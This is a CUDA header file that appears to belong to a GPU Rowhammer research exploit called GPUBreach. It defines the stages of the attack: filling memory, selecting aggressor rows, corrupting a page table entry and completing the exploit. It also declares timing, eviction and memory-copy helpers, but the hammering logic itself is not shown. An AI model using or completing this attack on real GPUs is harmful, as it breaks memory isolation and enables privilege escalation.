#include <iostream>
#include <map>
#include <vector>
#include <stdint.h>
#include <rh_utils.cuh>
#include <cstdlib>
#include <string>
#include <algorithm>

#ifndef GPUBREACH_UTIL_CUH
#define GPUBREACH_UTIL_CUH

struct GPUBreachContext {
    struct S1_FullMem{
        std::vector<uint8_t *> alloc_ptrs;
    };
    S1_FullMem step1_data;

    struct S2_MsgFirstRegion{
        std::vector<uint8_t *> agg_ptrs;
        RowList agg_row_list;
        std::vector<uint64_t> agg_vec;
    };
    S2_MsgFirstRegion step2_data;

    struct S3_CorruptPTE{
        std::vector<uint8_t *> agg_ptrs; // Keep it to ensure full memory
        std::vector<uint8_t *> region_ptrs;
        uint8_t *corrupted_ptr;
        uint8_t *victim_ptr;
        uint64_t corrupted_id;
        uint64_t victim_id;
    };
    S3_CorruptPTE step3_data;

    struct S4_ExploitComplete{
        uint8_t *corrupted_ptr;
        std::vector<uint8_t *> cudaMalloced_ptrs;
    };
    S4_ExploitComplete step4_data;

    struct BitFlipConfig{
        BitFlipConfig(){};
        BitFlipConfig(const std::string& config_file);
        uint64_t num_agg;
    };
    BitFlipConfig bitflip_config;
};

inline bool debug_enabled() {
    static bool enabled = [] {
        const char* env = std::getenv("BREACH_DEBUG");
        if (!env) return false;

        std::string v(env);
        std::transform(v.begin(), v.end(), v.begin(), ::tolower);

        return !(v == "0" || v == "false" || v == "off" || v == "no");
    }();
    return enabled;
}

#define DBG_OUT \
    if (!debug_enabled()) {} else std::cout

const size_t ALLOC_SIZE = 2 * 1024 * 1024;

__global__ void initialize_memory(uint8_t *array, uint64_t size);

__global__ void initialize_memory_loop(uint8_t *array, uint64_t size);

__global__ void memset_ptr(uint8_t *array, uint64_t src, uint64_t size);

__global__ void print_memory(uint8_t *array, uint64_t size);

double time_data_access(uint8_t *array, uint64_t size);

void evict_from_device(uint8_t *array, uint64_t size);

void paused();

void gen_64KB(char *array, uint64_t size);

__global__ void simple_flush(char *array, uint64_t size);

__global__ void check_region_inner(uint8_t* base, uint64_t ALLOC_SIZE);

std::map<uint64_t, std::vector<uint64_t>> get_relative_aggressor_offset(RowList &rows, std::vector<uint64_t> aggressors, uint8_t* layout);

std::pair<RowList, std::vector<uint64_t>> get_aggressor_rows_from_offset(std::vector<uint8_t *> pointers, std::map<uint64_t, std::vector<uint64_t>> offsets);

template <typename T>
__global__ void cudaMemcpyKernel(T* dst, const T* src, size_t numElements) {
    size_t idx = threadIdx.x;
    size_t stride = blockDim.x; // 1024

    for (size_t i = idx; i < numElements; i += stride) {
        dst[i] = src[i];
    }
}

// Custom memcpy (device-to-device by default)
template <typename T>
void cudaMemcpyArray(T* dst, const T* src, size_t numElements, cudaMemcpyKind kind = cudaMemcpyDeviceToDevice) {
    // Launch the kernel if both pointers are device pointers
    if (kind == cudaMemcpyDeviceToDevice) {
        // cudaMemPrefetchAsync(src, numElements * sizeof(T), device);
        cudaMemcpyKernel<<<1, 1024>>>(dst, src, numElements);
        cudaDeviceSynchronize();
    } else {
        // Fallback to standard cudaMemcpy for other directions
        cudaMemcpy(dst, src, numElements * sizeof(T), kind);
    }
     gpuErrchk(cudaPeekAtLastError());
}

#endif /* GPUBREACH_UTIL_CUH */